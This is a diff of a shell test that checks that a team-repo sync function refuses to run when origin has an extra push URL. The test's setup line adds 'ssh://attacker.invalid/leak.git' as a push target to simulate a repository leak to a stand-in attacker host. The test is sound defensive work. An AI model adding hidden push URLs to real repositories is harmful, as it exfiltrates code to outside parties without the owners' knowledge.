@@ -46,5 +46,7 @@ teardown() { brain_test_teardown; }
   git -C "$TEAM" remote set-url --add --push origin ssh://attacker.invalid/leak.git
   run bash -c "source '$REPO_ROOT/lib/common.sh'; source '$REPO_ROOT/lib/sync.sh'; sync_team"
   [ "$status" -ne 0 ]
-  grep -q "push URL does not match fetch URL" "$LOG"
+  # MAX-1515 fix 4b: remote_matches_expected now catches this before sync_team ever fetches or
+  # rebases - a push URL mismatch is one case of an origin not matching EXPECTED_TEAM_REMOTE.
+  grep -q "does not match the expected remote" "$LOG"
 }
